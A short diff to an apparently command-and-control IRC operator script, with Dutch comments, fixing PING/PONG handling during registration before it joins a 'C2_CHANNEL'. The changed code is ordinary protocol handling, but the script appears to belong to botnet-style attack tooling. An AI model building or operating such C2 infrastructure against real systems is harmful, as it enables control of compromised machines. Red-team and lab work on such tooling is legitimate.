@@ -122,13 +122,24 @@ except OSError as e:
 send_irc(sock, f'NICK {OPERATOR_NICK}')
 send_irc(sock, f'USER {OPERATOR_NICK} 0 * :{OPERATOR_NICK}')
 
-# Wacht op 001 (welcome) voor we joinen
+# Wacht op 001 (welcome) voor we joinen.
+# InspIRCd stuurt een PING tijdens registratie — beantwoord die meteen,
+# anders sluit de server de verbinding met "Connection timeout".
 buf = ''
-while True:
+registered = False
+while not registered:
     chunk = sock.recv(4096).decode('utf-8', errors='replace')
+    if not chunk:
+        print('[FOUT] Verbinding verbroken tijdens registratie')
+        sys.exit(1)
     buf += chunk
-    if ' 001 ' in buf:
-        break
+    lines = buf.split('\r\n')
+    buf = lines[-1]
+    for line in lines[:-1]:
+        if line.startswith('PING'):
+            send_irc(sock, 'PONG ' + line.split(' ', 1)[1])
+        if ' 001 ' in line:
+            registered = True
 
 send_irc(sock, f'JOIN {C2_CHANNEL}')
 print(f'[*] Joined {C2_CHANNEL}')
